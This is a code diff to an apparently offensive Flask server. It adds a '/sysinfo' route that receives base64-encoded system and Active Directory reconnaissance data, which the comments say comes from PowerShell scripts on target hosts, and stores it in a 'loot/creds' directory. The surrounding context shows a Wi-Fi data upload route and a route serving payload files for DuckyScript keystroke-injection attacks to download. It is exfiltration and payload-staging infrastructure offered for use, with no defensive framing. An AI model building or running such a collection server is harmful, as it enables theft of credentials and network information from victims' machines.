@@ -61,6 +61,24 @@ def upload_wifi():
     return "OK"
 
 
+@app.route("/sysinfo", methods=["POST"])
+def upload_sysinfo():
+    """Receive base64-encoded JSON sysinfo blob from sysinfo.ps1 / ad_recon.ps1."""
+    host = _safe_name(request.form.get("host", "unk"))
+    raw  = request.form.get("data", "")
+    if not raw:
+        return "missing data", 400
+    try:
+        data = base64.b64decode(raw).decode("utf-8", errors="replace")
+    except (binascii.Error, ValueError):
+        return "invalid base64", 400
+    dest = LOOT / "creds" / f"{host}_sysinfo.json"
+    dest.parent.mkdir(parents=True, exist_ok=True)
+    dest.write_text(data, encoding="utf-8")
+    print(f"[+] Sysinfo from {host} → {dest}")
+    return "OK"
+
+
 @app.route("/serve/<name>")
 def serve_file(name: str):
     """Serve a payload file so DuckyScript payloads can download it."""
